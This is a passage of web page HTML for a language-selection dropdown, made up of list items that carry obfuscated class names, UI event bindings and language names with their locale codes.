                        tabindex="-1"
                        data-value="lt"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">lietuvių</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="hu"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">magyar</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ms"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Melayu</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="nl"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Nederlands</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="no"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">norsk</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="uz"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">o‘zbek</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="pl"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">polski</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="pt-BR"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Português (Brasil)</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="pt-PT"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Português (Portugal)</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ro"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">română</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="sq"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">shqip</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="sk"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Slovenčina</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="sl"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">slovenščina</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="sr-Latn"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">srpski (latinica)</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="fi"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Suomi</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="sv"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Svenska</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="vi"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Tiếng Việt</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="tr"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Türkçe</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="el"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Ελληνικά</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="be"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">беларуская</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="bg"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">български</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ky"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">кыргызча</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="kk"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">қазақ тілі</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="mk"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">македонски</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="mn"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">монгол</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ru"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Русский</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="sr-Cyrl"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">српски (ћирилица)</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="uk"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Українська</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ka"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">ქართული</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="hy"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">հայերեն</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="iw"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">‫עברית‬‎</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ur"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">‫اردو‬‎</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ar"
                      >
